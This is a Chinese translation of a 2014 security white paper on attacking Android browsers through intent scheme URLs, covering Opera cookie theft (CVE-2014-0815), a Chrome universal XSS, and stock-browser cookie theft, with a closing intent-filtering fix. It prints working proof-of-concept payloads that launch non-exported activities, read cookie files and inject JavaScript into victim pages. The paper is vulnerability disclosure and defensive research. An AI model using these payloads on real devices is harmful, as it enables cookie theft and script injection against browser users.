# [译]白皮书 — 通过 intent scheme URLs 攻击 Android 浏览器
Takeshi Terada / Mitsui Bussan Secure Directions, Inc.(一家日本公司)
March 2014

- 发表时间：2014-3
- 翻译时间：2017-11-29 14:22:44

## 一、 介绍
Intent scheme URL 是一种特殊类型的 URL，它可以通过 web 页面启动安装在 android 手机上的其它 app。Android 平台下的许多主流浏览器都支持 Intnet scheme URL。

一般来说，恶意 web 页面可以通过 Intent scheme URL 针对 Android 手机上已经安装了的应用执行 intent-based(基于intent) 的攻击。因此，浏览器厂商采取了一些措施来降低这种风险。但是，这些措施不一定够。

在本报告中，我们首先解释什么是 Intet scheme URL，然后展示三个现存的，和 Intent scheme URL 相关的，Android 浏览器漏洞(涉及的风险包括 cookie 窃取和通用 XSS)，最后展示针对该漏洞的防范措施。

## 二、 关于 Intent shceme URL
Intent scheme URL 的使用形式如下：
```html
<script>
location.href = "intent:mydata1#Intent;action=myaction1;type=text/plain;end";
</script>
```

如果支持 Intent scheme URL 的浏览器加载了包含上述代码的 web 页面，浏览器将基于上述 URL 生成 intent 对象，然后尝试通过生成的 intent 启动 activity 。浏览器的动作可以被分为如下三个步骤：

### 2.1、 步骤一：解析 URL

对浏览器来说需要做的第一件事情是通过 intent scheme URL 生成一个 Intent 对象。浏览器通过 Android Framework 提供的 API `android.content.Intent.parseUri()` 来完成这件事：
```java
Intent intent = Intent.parseUri(uri);
```

简单的说，`Intent.parseUri(uri)` 方法从 URL 中解析出类似 `name=value` 的属性值，例如："action=...","category=..." 和 "launchFlags=..."。然后通过这些属性生成 intent 对象。

在上面的例子中，intent 对象生成过程中设置了 action："myaction1" ,type:"text/plain"。
```java
//个人理解
Intent intent = new Intent(“myaction”);
intent.setType(“text/plain”);
```
>有人说：
>>Intent intent = new Intent(“myaction”);      
>>intent.setType(“text/plain”);      
>>intent.setData(Uri.parse(“mydata”));       

>`intent.setData(Uri.parse(“mydata”));` 这一句我不理解，因为正常情况下一个完整的 URI 是 scheme://host/path 也就是:`intent.setData(Uri.parse(“scheme://host/path”));`, `#` 当然可以作为一种通配符来理解不过这中说法我是有点理解不了。

一般来说 URL 使用自定义的 scheme (例如：`blahscheme://host/path`) 经常用来从 web 页面启动一个 activity。相比于传统的 scheme ，intent scheme 有两个点。一是，这种 scheme 不要求目标 app 在 manifest 中定义 scheme，二是，在 URL 中可以包含 extras。一个 intent scheme URL 的例子如下：

```html
intent://foobar/#Intent;action=myaction1;type=text/plain;S.xyz=123;i.abc=678;end
```

在上面的例子中，生成的 intent 是包含 extra 实体的。
```java
//个人理解
Intent intent = new Intent("myaction1");
intent.setType(“text/plain”);
intent.putExtra("xyz","123");
intent.putExtra("abc",678);
```
例子中的 “S” 的含义是 string ， “i” 的含义是 integer。

关于 Intent scheme URL 的更多细节，可以查看源码 `Intent.parseUri()`[1] 或者 `Chrome document`[2] 。不幸的是， Android API 文档关于此方法没有太多的解释，所以，开发者或者安全研究员都对 Intent scheme URL 的理解并不广泛。

### 2.2、 步骤二：Intent 过滤/限制

出于安全的考虑，许多浏览器对“步骤一”中的 intent 对象的生成存在过滤。这种过滤可以对来自不信任的 web 页面通过 Intent scheme URL 发起的 intent-base 攻击提供针对性的保护。每一种浏览器都有起自己的过滤策略，我们已经发现有一些浏览器的保护策略不完善，甚至不存在。下文将通过三个例子来解释当前浏览器存在的一些缺陷和不足。

### 2.3、 步骤三：启动 activity

对浏览器来讲最终的步骤是使用通过“步骤二”过滤的 inetent 启动 activity。浏览器一般通过 `Context#startActivityIfNeeded()`或者`Context#startActivity()`来完成这一动作。上文已经提到过，主流浏览器都支持 intent scheme URL  。

|Browser                    |Intent Scheme Support|App Package                  | Name Version          |
|---------------------------|:-------------------:|-----------------------------|-----------------------|
|Old Stock Browser          |✓                    | com.android.browser         |(for Android 4.2.2)    |
|Chrome for Android         |✓                    | com.android.chrome          |30.0.1599.92           |
|Opera browser for Android  |✓                    | com.opera.browser           |16.0.1212.64462        |
|Samsung Browser            |✓                    | com.sec.android.app.sbrowser| 1.0 (on Galaxy S4)    |
|Firefox for Android        |－                    | org.mozilla.firefox         |26.0                   |

向上表所展示的，除 Firefox 之外的浏览器都支持 intent scheme URL 。

## 三、 攻击场景

利用 Intent scheme URL 的攻击场景有两种：

### 3.1、 类型一：针对浏览器应用的攻击
Intent scheme URL 可以被用来去攻击浏览器应用。更重要的事情是，恶意 web 页面可以通过浏览器应用发送 intent，该 intent 不仅可以启动导出的 activity，也可以启动非导出的 activit。这是可能的，因为发出 intent 的正是浏览器应用自身。

下一节我们将介绍几种这种类型的例子。

### 3.2、 类型二：针对任何已经安装的应用

Intent-based(基于intent)的漏洞通常通过已安装的漏洞应用被利用。寄生于浏览器的 web 页面可以通过使用 Intent scheme URL，成功的针对手机上已安装的任何应用发起 Intent-based 攻击。换句话说 Intent scheme URL 可能升级本地漏洞为远程 web 页面可利用的漏洞。我们在 2013 年在东京举办的的 Mobile Pwn2Own 比赛中使用这种技术攻陷 Samsung Galaxy S4。

## 四、 漏洞们

在我们的研究中，我们发现通过 Intent scheme URL 可以利用的三个浏览器存在漏洞。造成漏洞的原因是 Intent 过滤不足(上述 2.2 步骤二)。漏洞利用的概要下文叙述:

### 4.1、 Opera 浏览器(android移动版) Cookie 窃取

Opera 浏览器的 Intent filter 步骤完全缺失。因此通过 Intent scheme URL 可以启动任意 activity(包括非导出 activity )。攻击代码示例如下：

```html
<script>
location.href = "intent:#Intent;S.url=file:///data/data/com.opera.browser/app_opera/cookies;component=com.opera.browser/com.admarvel.android.ads.AdMarvelActivity;end";
</script>
```

通过上述代码，攻击者可以启动 Opera 浏览器的非导出 activity : `"com.admarvel.android.ads.AdMarvelActivity"` 。攻击代码中的 string extra `"url=file:///data/data/com.opera.browser/app_opera/cookies"` 指向 Opera 浏览器存储 cookie 的本地文件。

AdMarvelActivity 在一个支持 JavaScript 的 WebView 中加载了 URL(指向 cookie 文件)，并将之以 HTML 的形式呈现。因此，包含 cookie 文件内容的上下文中包含的恶意 HTML/JavaScrip 代码可以被执行。这意味着如果攻击者事先代码把 cookie 文件隐藏，攻击者可以窃取 cookie 文件中的所有内容，如下所示：

```xml
<script>
document.cookie = "x=<script>(javascript code)</scr"+"ipt>; path=/blah; expires=Tue, 01-Jan-2030 00:00:00 GMT";
</script>
```

我们于 2013-11 向 IPA(日本注册的信息技术推广管理机构) 提交了这个漏洞以及 PoC 代码。JPCERT/CC（与IPA合作的日本CSIRT组织）向供应商报告了此问题， 已于2014年1月发布。该漏洞的漏洞编码为：CVE-2014-0815 [4]。

### 4.2、 Android 版 Chrome UXSS(通用 XSS 漏洞)

针对 Chrome 的攻击有点复杂。Android 版 Chrome 包含如下 Java 代码：

```java
Intent intent = Intent.parseUri(uri);
intent.addCategory("android.intent.category.BROWSABLE");
intent.setComponent(null);
context.startActivityIfNeeded(intent, -1);
```

在第二行，Chrome 限制被启动的 Activity 包含 `BROWSABLE` category 。在第三行 Chrome 禁止显示调用。这些限制，针对 Intent-based 的攻击。

然而，限制是不充足的，我们可以通过 ` selector intent ` 来绕过上述限制，关于 selector 的一些 API：

Selector intent 是在 Android 4.0.3(API 15) 引入的机制。它是主 intent 对象中额外附加的一个 intent 对象。如果主 intent 中设置了 selector 属性，android 框架在解析该 intent 的时候将会按照附加 intent 对象的意图去做响应和反馈。

包含 selector intent 的 Intent scheme URL 如下所示：

```html
intent:#Intent;S.XXX=123;SEL;component=com.android.chrome/.xyz;end
```

“SEL” 部分就是 selector intent 的指示器。

上述 Intent scheme URL 为 Chrome 提供了一个 component 为 `com.android.chrome/.xyz` 的 intent，在这种情况下，即使 component 所指向的 activity 没有设置 BROWSABLE category 也是可以调用的。恶意 web 页面可以利用这一点去调用执行 chrome 的非导出 activity(包括哪些没有设置 BROWSABLE category 的activity)。

至此我们面对的新问题是，Chrome 是否存在非导出(或导出)的 activity 可以接收 intent-based 攻击。通过研究我们发现 WebappActivity 可以被 UXSS(Universal XSS 通用 XSS )攻陷。通过 JavaScript 发起攻击的一个例子如下：

```javascript
<script>

// open target web page (http://victim.example.jp/) in WebAppActivity0

location.href = "intent:#Intent;S.webapp_url=http://victim.example.jp;l.webapp_id=0;SEL;component=com.android.chrome/com.google.android.apps.chrome.webapps.WebappActivity0;end";

// a few seconds later, inject javascript payload into target web page

setTimeout(
    function() {
        location.href = "intent:#Intent;S.webapp_url=javascript:(malicious javascript code);l.webapp_id=1;SEL;component=com.android.chrome/com.google.android.apps.chrome.webapps.WebappActivity0;end";
        }
    , 2000);
</script>
```

在以上的代码中，恶意 web 页面两次明确的启动了 `com.google.android.apps.chrome.webapps.WebappActivity0` 。这个 activity 是一个非导出的 activity 并且它不包含 BROWSABLE category，但是 web 页面可以通过使用携带 selector intent 的 intent scheme URL 启动它。

我们的 PoC 代码中，第一次关注点在“通过 Web 页面启动 WebappActivity0”，第二次在启动目标 activity 的 web 页面中注入了恶意 JavaScript 代码。这意味着攻击者可以在基于 http/https 的 web 页面中注入任意 JavaScript 代码。(这就是 Universal XSS)。

据我们所知，旧版的 Chrome(v.30.0.1599.92) 存在 UXSS 漏洞。新版本的漏洞不再像旧版本呢一样容易利用，因为 WebappActivity0 已经修改为在新的 tab 中打开 URL。然而潜在的风险依然存在，因为当前版本的 Chrome 依然没有过滤 selector intent，所以恶意 web 页面可以启动 Chrome 的非导出 activity。

### 4.3、旧版本 stock 浏览器 Cookie 窃取
android stock browser(com.android.browser) 存在相似的漏洞。像 Android Chrome 一样，stock broswer 没有恰当地过滤 selector intent ，以至于攻击者可以通过恶意 web page 启动 stock browser 的任意 activity。

这种缺陷可以被用来窃取 cookie ，这一点和 Opera 浏览器很像。但是最近的 android 模拟器(>= android4.3 Level 18)或许不会受到影响，因为旧版本的 stock 浏览器不在被默认安装到每一个设备中了。

## 五、 解决方案

在这个报告中，我们解释了通过 Intent scheme URL 发起的恶意攻击，在三款 android 浏览器中存在漏洞。像第四部分说的一样，不恰当的使用 Intent Scheme URL 可能造成严重的漏洞，例如 Cookie 窃取和 UXSS。

针对这种攻击的操作是过滤 Intent 对象(从 Intent Scheme URL 转换而来的 Intent 对象)。过滤方式：

```java
// convert intent scheme URL to intent object
Intent intent = Intent.parseUri(uri);
// forbid launching activities without BROWSABLE category
intent.addCategory("android.intent.category.BROWSABLE");
// forbid explicit call
intent.setComponent(null);
// forbid intent with selector intent
intent.setSelector(null);
// start the activity by the intent
context.startActivityIfNeeded(intent, -1);
```

最后我们想去触及更多浏览器所涉及的风险。但是如你所知，这个世界上的 android 浏览器多不胜数，我们所调查过的都在第二部分列了出来。本文未涉及的浏览器也可能存在通过 Intent Scheme URL 可以用的漏洞，因为许多浏览器都是基于 stock browser 开发的。

>个人理解：上述所提到的启动任何 activity 所指的 activiyt 应该是 browser 中的 activity ，因为 browser 是不能做到启动任何非导出的 activity 的。

## 六、 引用
2. [1] https://android.googlesource.com/platform/frameworks/base/+/android-4.3.1_r1/core/java/android/content/Intent.java
2. [2] https://developers.google.com/chrome/mobile/docs/intents
3. [3] http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Local-Japanese-team-exploits-mobile-applications-to-install/ba-p/6267417
4. [4] http://jvndb.jvn.jp/en/contents/2014/JVNDB-2014-000014.html
5. [5] http://developer.android.com/reference/android/content/Intent.html#setSelector(android.content.Intent)

## 七、 OVER

----


## 翻译过程中的：参考 & 引用
1. https://www.mbsd.jp/Whitepaper/IntentScheme.pdf
    - http://www.androidchina.net/6145.html
    - https://www.cnblogs.com/lytwajue/p/6724055.html
    - https://zhuanlan.zhihu.com/p/23109883
	
    
